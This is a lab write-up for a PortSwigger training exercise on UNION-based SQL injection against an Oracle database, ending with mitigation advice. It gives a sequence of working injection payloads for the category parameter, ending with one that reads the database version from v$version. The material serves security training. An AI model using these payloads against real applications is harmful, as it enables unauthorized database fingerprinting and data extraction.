# SQL Injection – UNION-based Version Disclosure

# Vulnerability Overview
The application is vulnerable to SQL Injection in the category parameter, allowing attackers to extract database information using UNION queries.

# Steps to Reproduce

**Lab Link** >> https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

# Navigate to:
* /filter?category=Gifts

# Confirm injection point
* category=Gifts'
    Returns server error (SQL syntax issue)

# Determine number of columns:
* category=Gifts' ORDER BY 2--
    Response: 200 OK

* category=Gifts' ORDER BY 3--
>>>Error >>> Confirms 2 columns

# Test UNION query
* category=Gifts' UNION SELECT NULL, NULL FROM dual--
>>> Successful execution → Confirms Oracle database

# Identify string-compatible columns:
* category=Gifts' UNION SELECT 'test','test' FROM dual--
>>> Both columns accept string input

# Extract database version:
* category=Gifts' UNION SELECT NULL, banner FROM v$version--
→ Displays Oracle database version

# Payload Used
* ' UNION SELECT NULL, banner FROM v$version--

# Impact
* An attacker can perform database fingerprinting and extract sensitive information, enabling targeted attacks based on the database version.

# Tools Used
* Browser
* Burp Suite (Proxy, Repeater)

# Mitigation
* Use parameterized queries
* Implement input validation
* Restrict database error messages